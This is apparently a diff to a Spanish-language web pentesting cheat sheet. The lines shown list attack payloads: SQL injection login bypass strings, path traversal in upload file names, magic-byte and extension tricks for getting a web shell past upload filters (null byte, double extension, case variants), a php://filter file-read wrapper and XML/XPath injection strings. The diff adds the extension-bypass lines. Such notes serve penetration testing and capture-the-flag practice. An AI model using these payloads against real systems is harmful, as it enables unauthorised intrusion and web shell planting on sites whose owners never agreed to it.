@@ -116,10 +116,16 @@ Con SSI (Server Side Includes), siempre que sea archivo shtml podemos ejecutar c
 Probar en usuarios y contraseñas ' or 1=1;--
 Al poder subir archivos, si podemos elegir el nombre del archivo y no se chequea la entrada, podemos subirlos en otras localizaciones usando ../nombreArchivo
 Para bypassear filtro de extensión, poner .nuevaExtension
+
 Para bypassear filtro MIME, para imagen poner
 	GIF89a
 	%PDF-1.4
 	al inicio de la shell
+	
+Bypass filtro extensión
+	shell.php%00.gif
+	shell.jpg.php
+	shell.PhP .pHp .PHp .php5
 php://filter/convert.base64-encode/resource=index
 Para formularios que usen XML user:pass del tipo user=X and pass=Y:
 	-> '(false) or 1=1(true) or 'a'='a(true) // and false de la pass
